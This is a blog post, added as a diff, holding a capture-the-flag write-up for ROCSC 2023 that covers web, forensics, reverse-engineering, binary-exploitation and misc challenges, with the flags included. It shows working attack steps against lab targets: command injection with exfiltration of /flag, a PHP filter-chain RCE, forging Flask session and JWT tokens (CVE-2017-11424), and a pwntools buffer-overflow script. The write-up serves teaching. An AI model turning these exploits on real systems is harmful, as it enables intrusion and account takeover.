@@ -1,0 +1,476 @@
+<!DOCTYPE html><html class="appearance-dark" lang="en"><head><meta charset="UTF-8"><title>ROCSC</title><meta name="description" content="This is Ischyros blog where he posts cyber security topics and sheets"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
+<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/ISC.png"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="
+
+ROCSC 2023Author: Iulian Schifirnet
+Summaryhashy : webProof of FlagROCSC{F82590885D27ECD16EB594E2923D16E112B3C46CFC1BAA4ABD13F7802A3A5558}
+SummaryThere is an input field that encrypts anything you give it into a MD5 format.
+
+
+Trying to crack the hash using https://crackstation.net/
+
+
+Proof of SolveTypically behind this type of challenges there is a syste.."><meta name="generator" content="Hexo 6.3.0"></head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Ischyr's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">ROCSC</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ROCSC-2023"><span class="toc-text">ROCSC 2023</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Summary"><span class="toc-text">Summary</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hashy-web"><span class="toc-text">hashy : web</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Proof-of-Flag"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Summary-1"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Proof-of-Solve"><span class="toc-text">Proof of Solve</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#i-am-php-web"><span class="toc-text">i-am-php : web</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Proof-of-Flag-1"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Summary-2"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Proof-of-Solve-1"><span class="toc-text">Proof of Solve</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rocker-web"><span class="toc-text">rocker : web</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Proof-of-Flag-2"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Summary-3"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Proof-of-Solve-2"><span class="toc-text">Proof of Solve</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wheel-of-misfortune-web"><span class="toc-text">wheel-of-misfortune : web</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Proof-of-Flag-3"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Summary-4"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Proof-of-Solve-3"><span class="toc-text">Proof of Solve</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#intruder-network"><span class="toc-text">intruder : network</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Proof-of-Flag-4"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Summary-5"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Proof-of-Solve-4"><span class="toc-text">Proof of Solve</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#analog-signal-forensics"><span class="toc-text">analog-signal : forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Proof-of-Flag-5"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Summary-6"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Proof-of-Solve-5"><span class="toc-text">Proof of Solve</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xarm-reverse-enginnering"><span class="toc-text">xarm : reverse enginnering</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Proof-of-Flag-6"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Summary-7"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Proof-of-Solve-6"><span class="toc-text">Proof of Solve</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#luigi-binary-exploitation"><span class="toc-text">luigi : binary exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Proof-of-Flag-7"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Summary-8"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Proof-of-Solve-7"><span class="toc-text">Proof of Solve</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#combinations-misc"><span class="toc-text">combinations : misc</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Proof-of-Flag-8"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Summary-9"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Proof-of-Solve-8"><span class="toc-text">Proof of Solve</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#threat-hunting-threat-hunting"><span class="toc-text">threat-hunting : threat hunting</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Proof-of-Flag-9"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Summary-10"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Proof-of-Solve-9"><span class="toc-text">Proof of Solve</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nopce-cryptography"><span class="toc-text">nopce : cryptography</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Proof-of-Flag-10"><span class="toc-text">Proof of Flag</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Summary-11"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Proof-of-Solve-10"><span class="toc-text">Proof of Solve</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/CTF"><i class="tag post-item-tag">CTF</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">ROCSC</h1><time class="has-text-grey" datetime="2023-05-28T11:55:32.000Z">2023-05-28</time><article class="mt-2 post-content"><img src="/2023/05/28/rocsc-2023/CAMPIONAT.jpg" class="">
+
+<h1 id="ROCSC-2023"><a href="#ROCSC-2023" class="headerlink" title="ROCSC 2023"></a>ROCSC 2023</h1><p>Author: Iulian Schifirnet</p>
+<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><h3 id="hashy-web"><a href="#hashy-web" class="headerlink" title="hashy : web"></a>hashy : web</h3><h6 id="Proof-of-Flag"><a href="#Proof-of-Flag" class="headerlink" title="Proof of Flag"></a>Proof of Flag</h6><p>ROCSC{F82590885D27ECD16EB594E2923D16E112B3C46CFC1BAA4ABD13F7802A3A5558}</p>
+<h6 id="Summary-1"><a href="#Summary-1" class="headerlink" title="Summary"></a>Summary</h6><p>There is an input field that encrypts anything you give it into a MD5 format.</p>
+<img src="/2023/05/28/rocsc-2023/12.07.05.png" class="">
+
+<p>Trying to crack the hash using <a target="_blank" rel="noopener" href="https://crackstation.net/">https://crackstation.net/</a></p>
+<img src="/2023/05/28/rocsc-2023/12.08.06.png" class="">
+
+<h6 id="Proof-of-Solve"><a href="#Proof-of-Solve" class="headerlink" title="Proof of Solve"></a>Proof of Solve</h6><p>Typically behind this type of challenges there is a system command where you can escape it and get a <strong>command injection</strong>. We can also see that from the “-“ after the resulted hash which means that this came from stdin.<br>We can verify that by giving it a known command that would give a common result in order to be cracked:</p>
+<img src="/2023/05/28/rocsc-2023/12.13.09.png" class="">
+
+<p>Trying to decode this on <strong>crackstation</strong> will give us <code>www-data</code>.<br>Knowing that the flag is located at <code>/flag</code> we can try to extract it using <strong>request-bin</strong>.</p>
+<img src="/2023/05/28/rocsc-2023/12.16.08.png" class="">
+
+<h3 id="i-am-php-web"><a href="#i-am-php-web" class="headerlink" title="i-am-php : web"></a>i-am-php : web</h3><h6 id="Proof-of-Flag-1"><a href="#Proof-of-Flag-1" class="headerlink" title="Proof of Flag"></a>Proof of Flag</h6><p>CTF{db21629aa63aa7add8be1b2f435d49238243cbf5e87f2b736a691c3f62d647d5}</p>
+<h6 id="Summary-2"><a href="#Summary-2" class="headerlink" title="Summary"></a>Summary</h6><p>We get the source code of the application:</p>
+<img src="/2023/05/28/rocsc-2023/12.26.55.png" class="">
+
+<p>After some analysis we can see that the user input is not properly validated.<br>The vulnerability lies in the <code>include($this-&gt;filePath)</code> line inside the <code>__destruct()</code> method.<br>The <code>__destruct()</code> method is automatically called when an object is destroyed or goes out of scope. In this code, it includes the file specified by the <code>$filePath</code> property, which is assigned based on the <code>$_GET[&#39;param&#39;]</code> value. This means that an attacker can manipulate the <code>$_GET[&#39;param&#39;]</code> value to execute arbitrary PHP code.</p>
+<h6 id="Proof-of-Solve-1"><a href="#Proof-of-Solve-1" class="headerlink" title="Proof of Solve"></a>Proof of Solve</h6><p>Knowing this we can start chaining our php code using: <a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p>
+<img src="/2023/05/28/rocsc-2023/12.31.22.png" class="">
+
+<p>Trying to execute the code:</p>
+<img src="/2023/05/28/rocsc-2023/12.32.36.png" class="">
+
+<p>And we can see that we have successfully exploited this vulnerability. Now the flag is located in the <strong>f73…</strong> directory so you just need to change the payload to: <code>cat f73*/flag.php</code></p>
+<h3 id="rocker-web"><a href="#rocker-web" class="headerlink" title="rocker : web"></a>rocker : web</h3><h6 id="Proof-of-Flag-2"><a href="#Proof-of-Flag-2" class="headerlink" title="Proof of Flag"></a>Proof of Flag</h6><p>CTF{4666c3220395739618c1657045b6b1289817b6e84326b45c7c651aab51a94fe2}</p>
+<h6 id="Summary-3"><a href="#Summary-3" class="headerlink" title="Summary"></a>Summary</h6><p>We get the source code of the application:</p>
+<img src="/2023/05/28/rocsc-2023/12.36.13.png" class="">
+
+<p>We can see that when you are trying to <strong>POST</strong> to “&#x2F;“ a session cookie will be created:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ curl -XPOST http:&#x2F;&#x2F;34.159.31.74:31958&#x2F; -v
+*   Trying 34.159.31.74:31958...
+* Connected to 34.159.31.74 (34.159.31.74) port 31958 (#0)
+&gt; POST &#x2F; HTTP&#x2F;1.1
+&gt; Host: 34.159.31.74:31958
+&gt; User-Agent: curl&#x2F;7.88.1
+&gt; Accept: *&#x2F;*
+&gt; 
+&lt; HTTP&#x2F;1.1 200 OK
+&lt; Server: Werkzeug&#x2F;2.3.4 Python&#x2F;3.10.6
+&lt; Date: Sun, 28 May 2023 09:39:34 GMT
+&lt; Content-Type: text&#x2F;html; charset&#x3D;utf-8
+&lt; Content-Length: 56
+&lt; Vary: Cookie
+&lt; Set-Cookie: session&#x3D;eyJ1c2VyX3R5cGUiOiJ1c2VyIn0.ZHMhVg.qXTqDzYA1qLo-B90RF98G_42JA4; HttpOnly; Path&#x3D;&#x2F;
+&lt; Connection: close
+&lt; 
+* Closing connection 0
+Timestamp key set in session: 2023-05-28 09:39:34.204809</code></pre>
+
+<p>Looking on the code we can see that the app secret key is the current timestamp of the server.<br>So we can try to <strong>bruteforce</strong> the timestamp and find the secret key.</p>
+<h6 id="Proof-of-Solve-2"><a href="#Proof-of-Solve-2" class="headerlink" title="Proof of Solve"></a>Proof of Solve</h6><p>When I solved the challenge the server’s timestamp was pretty low so I didn’t need to guess that much when the server was started:</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">#!&#x2F;usr&#x2F;bin&#x2F;env python3
+import datetime
+
+&quot;&quot;&quot;
+26 May 2023 14:11:2326 May 2023 14:11:23
+&quot;&quot;&quot;
+
+def get_datetime():
+	for i in range(60):
+		for x in range(60):
+			date &#x3D; datetime.datetime(2023, 5, 26, 13, i, x)
+			print(str(date))
+
+get_datetime()</code></pre>
+
+<p>After generating the payloads we can start trying to crack the token using <code>flask-unsign</code>:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flask-unsign --decode --cookie &quot;eyJ1c2VyX3R5cGUiOiJ1c2VyIn0.ZHMhVg.qXTqDzYA1qLo-B90RF98G_42JA4&quot; -w wordlist.lst</code></pre>
+
+<p>Now after cracking the secret key the last thing we need to do is to craft another token and try to access the <strong>&#x2F;flag</strong> endpoint:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flask-unsign --sign --cookie &quot;&#123;&#39;user_type&#39;: &#39;admin&#39;&#125;&quot; --secret &quot;2023-05-26 13:03:39&quot;</code></pre>
+
+<h3 id="wheel-of-misfortune-web"><a href="#wheel-of-misfortune-web" class="headerlink" title="wheel-of-misfortune : web"></a>wheel-of-misfortune : web</h3><h6 id="Proof-of-Flag-3"><a href="#Proof-of-Flag-3" class="headerlink" title="Proof of Flag"></a>Proof of Flag</h6><p>CTF{8400de2552d48551d36f0a25c40430fc488f035b68bdca4fe3d8875a86a5d037}</p>
+<h6 id="Summary-4"><a href="#Summary-4" class="headerlink" title="Summary"></a>Summary</h6><p>We are given a zip file containing the web application and structure.<br>Starting to look on the server application code we can see a strange line of code:</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">jwt.decode(token, app.config[&#39;PUBLIC_KEY&#39;], algorithms&#x3D;[&#39;RS256&#39;,&#39;HS256&#39;])</code></pre>
+<p>There is a problem because this is using 2 algorithms on the decryption function.<br>Also if you look closely on the code you can see that it’s testing if the user luck &#x2F; 100 is grater than random.random():</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">if random.random() &lt; user[&#39;luck&#39;] &#x2F; 100:
+	return &#123;&quot;status&quot;: 7, &quot;message&quot;: os.getenv(&#39;FLAG&#39;)&#125;, 200</code></pre>
+<p>So basically if we manage to modify the user’s luck we can give it a very large number so we will be able to get the flag.<br>The other problem is that if you are looking on the <strong>requirments.txt</strong> file you can see that the version of <strong>pyjwt</strong> is 1.5.0 which is vulnerable: <a target="_blank" rel="noopener" href="https://github.com/silentsignal/rsa_sign2n/tree/release/CVE-2017-11424">https://github.com/silentsignal/rsa_sign2n/tree/release/CVE-2017-11424</a></p>
+<h6 id="Proof-of-Solve-3"><a href="#Proof-of-Solve-3" class="headerlink" title="Proof of Solve"></a>Proof of Solve</h6><p>In order to get the exploit working correctly we need to get the jwt token before trying to spin the wheel and the jwt token after spinning the wheel.<br>Save the 2 tokens in 2 different files and:<br><code>python3.8.10 x_CVE-2017-11424.py $(cat tok1.txt) $(cat tok2.txt)</code><br>Once the exploit is finished you will get a <strong>.pem</strong> file that you will be able to use in order to craft another session token.</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">#!&#x2F;usr&#x2F;bin&#x2F;env&#x2F;python3
+import jwt
+
+with open(&quot;key.pem&quot;, &quot;rb&quot;) as f:
+	content &#x3D; f.read()
+
+print(content)
+session &#x3D; &#123;&#39;username&#39;: f&#39;Hacker&#39;, &#39;money&#39;: 5, &#39;luck&#39;: 0x1337&#125;
+token &#x3D; jwt.encode(session, content, algorithm&#x3D;&quot;HS256&quot;)
+print(token)</code></pre>
+
+<p>Now after the token is created you just need to simply curl the <strong>&#x2F;spin</strong> endpoint with the new session token and get the flag.</p>
+<h3 id="intruder-network"><a href="#intruder-network" class="headerlink" title="intruder : network"></a>intruder : network</h3><h6 id="Proof-of-Flag-4"><a href="#Proof-of-Flag-4" class="headerlink" title="Proof of Flag"></a>Proof of Flag</h6><p>CTF{506f80a01ad6983cc1df148087f3d4fb59e9aacbde60d45766361a5c6b3cbcda}</p>
+<h6 id="Summary-5"><a href="#Summary-5" class="headerlink" title="Summary"></a>Summary</h6><p>We are given a <strong>.pcap</strong> file that contains a lot of traffic.</p>
+<img src="/2023/05/28/rocsc-2023/13.08.45.png" class="">
+
+<p>We can see that there are a lot of requests that look interesting.<br>Going on <strong>File -&gt; Export Objects</strong> we can try to extract the requests. But the only one looking interesting is the first <strong>execute</strong> request so we will extract just this one.<br>Looking on the hex of the file we can see something interesting:</p>
+<img src="/2023/05/28/rocsc-2023/13.14.41.png" class="">
+
+<h6 id="Proof-of-Solve-4"><a href="#Proof-of-Solve-4" class="headerlink" title="Proof of Solve"></a>Proof of Solve</h6><p>There is a <strong>GIF</strong> header which indicates that this could be an image.<br>Trying to open this will get us a format error so we need to clean this image firstly.<br>We will use <strong>hexedit</strong> to replace everything before the <strong>GIF</strong> header with 00 bytes.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ xxd extracted_image.gif             
+00000000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000080: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000090: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+000000a0: 0000 0000 0000 0000 0000 0000 4749 4638  ............GIF8
+000000b0: 3961 a406 9808 f000 0000 0000 0000 0021  9a.............!
+000000c0: f904 0100 0000 0021 ff0b 4943 4352 4742  .......!..ICCRGB</code></pre>
+
+<p>Now the problem is that the magic header is very down so we need to get get rid of the bytes before the magic header:</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">└─$ cat xpl.py 
+with open(&#39;image_file.gif&#39;, &#39;rb&#39;) as file:
+    image_bytes &#x3D; file.read()
+
+# Find the index of &quot;GIF89a&quot; in the byte data
+start_index &#x3D; image_bytes.index(b&#39;GIF89a&#39;)
+
+# Remove the bytes before &quot;GIF89a&quot;
+modified_bytes &#x3D; image_bytes[start_index:]
+
+# Create a new file with modified data
+with open(&#39;new_image_file.gif&#39;, &#39;wb&#39;) as new_file:
+    new_file.write(modified_bytes)</code></pre>
+
+<p>Now if we try to open the gif image we can see that we got the flag:</p>
+<img src="/2023/05/28/rocsc-2023/13.19.00.png" class="">
+
+<h3 id="analog-signal-forensics"><a href="#analog-signal-forensics" class="headerlink" title="analog-signal : forensics"></a>analog-signal : forensics</h3><h6 id="Proof-of-Flag-5"><a href="#Proof-of-Flag-5" class="headerlink" title="Proof of Flag"></a>Proof of Flag</h6><p>ctf{7a56113c90117047d79556ae90ae926b4b163f1ef6f7aa2ad9db3e4296290ada}</p>
+<h6 id="Summary-6"><a href="#Summary-6" class="headerlink" title="Summary"></a>Summary</h6><p>You are given a <strong>.wav</strong> file that has a strange format. Firstly I didn’t look very in depth on the format of the file and I started find a way to solve the challenge.<br>I tried <strong>LSB</strong> and nothing interesting showed up, I tried opening the <strong>.wav</strong> file in Audacity and look on the Spectrogram but again nothing interesting was found.<br>After a long time I decided to look again on the format of the file ( WAVE audio, IEEE Float, mono 44100 Hz ) and started to search.</p>
+<h6 id="Proof-of-Solve-5"><a href="#Proof-of-Solve-5" class="headerlink" title="Proof of Solve"></a>Proof of Solve</h6><p>After searching for the format I found a post based on CTF wav files ( <a target="_blank" rel="noopener" href="https://github.com/welchbj/ctf/blob/master/docs/steganography.md">https://github.com/welchbj/ctf/blob/master/docs/steganography.md</a> )</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">#!&#x2F;usr&#x2F;bin&#x2F;env python3
+
+import bitstring
+import soundfile as sf
+
+def binary(fl):
+    bs &#x3D; bitstring.BitArray(float&#x3D;fl, length&#x3D;32)
+    return bs.bin
+
+def main():
+    data, fs &#x3D; sf.read(&#39;analog-signal.wav&#39;)
+
+    for d in data:
+        print(binary(d))
+
+if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
+    main()</code></pre>
+
+<p>Using the python script gave me something interesting:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ python3 analog.py
+10111111100000000000000000000000
+00111111100000000000000000000000
+00111111100000000000000000000000
+10111111100000000000000000000000
+10111111100000000000000000000000
+10111111100000000000000000000000
+00111111100000000000000000000000
+00111111100000000000000000000000
+10111111100000000000000000000000
+00111111100000000000000000000000
+00111111100000000000000000000000
+00111111100000000000000000000000
+10111111100000000000000000000000
+00111111100000000000000000000000
+10111111100000000000000000000000
+10111111100000000000000000000000
+10111111100000000000000000000000
+00111111100000000000000000000000
+00111111100000000000000000000000
+10111111100000000000000000000000
+[...]</code></pre>
+
+<p>As you can see the only thing that changes is the first bit so we will extract just the first bit and see what we get:</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">└─$ python3 script.py analog_signal.wav 
+100111001000101110011001100001001100100010011110110010101100100111001110110011101100110010011100110001101100111111001110110011101100100011001111110010111100100010011011110010001100011011001010110010101100100110011110100110101100011011001111100111101001101011000110110011011100100110011101110010111001110111001110110010011100110010011001110011101001101010011001110010011001100111001000100111101001111011001101100111101001101111000110100110111001110111001100100110101100101111001101110001101100100111001101110001101100111110011110100110111001111010000010 </code></pre>
+
+<p>Trying to decode this didn’t get us anything interesting… So I decided to xor the output with a key that increments for 1 to 256 and we got the flag:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">[...]
+Key: 254 b&#39;bugz6&#96;47002b81006156e68447&#96;d81&#96;d837c5c072g0dg7g6&#96;&#96;3&#96;e8ec2d5387381&#96;e&#96;|&#39;
+Key: 255 b&#39;ctf&#123;7a56113c90117047d79556ae90ae926b4b163f1ef6f7aa2ad9db3e4296290ada&#125;&#39;</code></pre>
+
+<h3 id="xarm-reverse-enginnering"><a href="#xarm-reverse-enginnering" class="headerlink" title="xarm : reverse enginnering"></a>xarm : reverse enginnering</h3><h6 id="Proof-of-Flag-6"><a href="#Proof-of-Flag-6" class="headerlink" title="Proof of Flag"></a>Proof of Flag</h6><p>CTF{8604cd0b7ddd5065780e43449aa7aeacdb0316358d73252524d40fa5c5fc5819}</p>
+<h6 id="Summary-7"><a href="#Summary-7" class="headerlink" title="Summary"></a>Summary</h6><p>We get a 32 bit <strong>ARM</strong> executable and a encrypted flag:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ cat flag.enc    
+ER@&#125;&gt;062eb6d1bbb36031&gt;6c2522?gg1gcgebd657053&gt;b15434342b26&#96;g3e3&#96;e3&gt;7?&#123;</code></pre>
+
+<p>Opening the binary in <strong>Ghidra</strong> we can see that it’s doing a XOR operation on the encrypted flag. </p>
+<img src="/2023/05/28/rocsc-2023/13.45.28.png" class="">
+<p>With the following values:</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">local_c &#x3D; 0;
+memcpy(acStack_70,&quot;If You see this you can decode the flag.txt&quot;,0x2c);
+memset(auStack_44,0,0x38);
+sVar1 &#x3D; strcspn(acStack_70,&quot;\n&quot;);
+acStack_70[sVar1] &#x3D; &#39;\0&#39;;
+FUN_00010584(acStack_70,0x55,0x45,0x58,0x10,0xa1,0x23,0x25,0x20,0x89,0x56,0x75,0x73);
+iVar2 &#x3D; printf(&quot;Encrypted string: %s\n&quot;,acStack_70);
+if (local_c !&#x3D; 0) &#123;
+				&#x2F;* WARNING: Subroutine does not return *&#x2F;
+__stack_chk_fail(iVar2,local_c,0);
+&#125;
+return 0;
+&#125;</code></pre>
+
+<h6 id="Proof-of-Solve-6"><a href="#Proof-of-Solve-6" class="headerlink" title="Proof of Solve"></a>Proof of Solve</h6><pre class="line-numbers language-python" data-language="python"><code class="language-python">─$ cat asd.py 
+def decrypt_string(encrypted_string):
+    decrypted &#x3D; &quot;&quot;
+    for char in encrypted_string:
+        decrypted +&#x3D; chr(ord(char) ^ 0x73 ^ 0x75 ^ 0x56 ^ 0x89 ^ 0x20 ^ 0x25 ^ 0x23 ^ 0xa1 ^ 0x10 ^ 0x58 ^ 0x45 ^ 0x55)
+    return decrypted
+
+encrypted_string &#x3D; &quot;ER@&#125;&gt;062eb6d1bbb36031&gt;6c2522?gg1gcgebd657053&gt;b15434342b26&#96;g3e3&#96;e3&gt;7?&#123;&quot;
+decrypted_string &#x3D; decrypt_string(encrypted_string)
+print(&quot;Decrypted string:&quot;, decrypted_string)</code></pre>
+
+<h3 id="luigi-binary-exploitation"><a href="#luigi-binary-exploitation" class="headerlink" title="luigi : binary exploitation"></a>luigi : binary exploitation</h3><h6 id="Proof-of-Flag-7"><a href="#Proof-of-Flag-7" class="headerlink" title="Proof of Flag"></a>Proof of Flag</h6><p>CTF{328f2c6f56d1097d511495607fea09487c84a071379541079795a805da3cc9bd}</p>
+<h6 id="Summary-8"><a href="#Summary-8" class="headerlink" title="Summary"></a>Summary</h6><p>You get a binary executable that print’s the win function. This type of technique is called <strong>ret2win</strong> and I have a detailed walkthrough on this technique on my blog: <a target="_blank" rel="noopener" href="https://ischyr.github.io/2023/05/24/ret2win/">https://ischyr.github.io/2023/05/24/ret2win/</a><br>The only difference here is that you just need to extract the win function address.</p>
+<h6 id="Proof-of-Solve-7"><a href="#Proof-of-Solve-7" class="headerlink" title="Proof of Solve"></a>Proof of Solve</h6><pre class="line-numbers language-python" data-language="python"><code class="language-python">#!&#x2F;usr&#x2F;bin&#x2F;env python
+from pwn import *
+context.log_level&#x3D;&#39;DEBUG&#39;
+
+p &#x3D; process(&quot;.&#x2F;vuln&quot;)
+elf &#x3D; ELF(&quot;.&#x2F;vuln&quot;, checksec&#x3D;False)
+libc &#x3D; elf.libc
+rop &#x3D; ROP(elf)
+
+def start():
+	if not args.REMOTE:
+		return process(&quot;.&#x2F;vuln&quot;)
+	else:
+		return remote(&quot;34.159.31.74&quot;, 32496)
+
+p &#x3D; start()
+
+def main():
+
+	global rop
+
+	print(p.recvuntil(b&quot;Luigi and Mario are true friends for this Mario give flag: &quot;))
+	flag &#x3D; int(p.recvline().strip(b&quot;\n&quot;), 16)
+	log.info(&quot;Address: &quot; + hex(flag))
+
+	payload &#x3D; b&quot;&quot;
+	payload +&#x3D; b&quot;A&quot;*40
+	payload +&#x3D; p64(flag)
+
+	p.sendline(payload)
+	p.interactive()
+
+if __name__&#x3D;&#x3D;&quot;__main__&quot;:
+	main()</code></pre>
+
+<h3 id="combinations-misc"><a href="#combinations-misc" class="headerlink" title="combinations : misc"></a>combinations : misc</h3><h6 id="Proof-of-Flag-8"><a href="#Proof-of-Flag-8" class="headerlink" title="Proof of Flag"></a>Proof of Flag</h6><p>CTF{89cd42c9b9aad2cde15ec79f98f989bb78df5cd2b006e5fd4c13b119d442e20b}</p>
+<h6 id="Summary-9"><a href="#Summary-9" class="headerlink" title="Summary"></a>Summary</h6><p>You get a png image called <strong>combinations.png</strong> that is a little bit too big for a normal PNG file.</p>
+<h6 id="Proof-of-Solve-8"><a href="#Proof-of-Solve-8" class="headerlink" title="Proof of Solve"></a>Proof of Solve</h6><p>Using <strong>binwalk</strong> on the PNG you will get a file called <strong>combinations.txt</strong> that contains a very big base64 string. By trying to decode it we will find out that it’s an <strong>ELF</strong> executable that again inside itt contains some <strong>PNG</strong> files:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ cat combinations.txt| base64 -d | strings | head
+&#x2F;lib64&#x2F;ld-linux-x86-64.so.2
+image_1.pngUT
+Zldux
+P:QJ
+g:w5
+hR;Eo
+&#125;jek
+N_2*
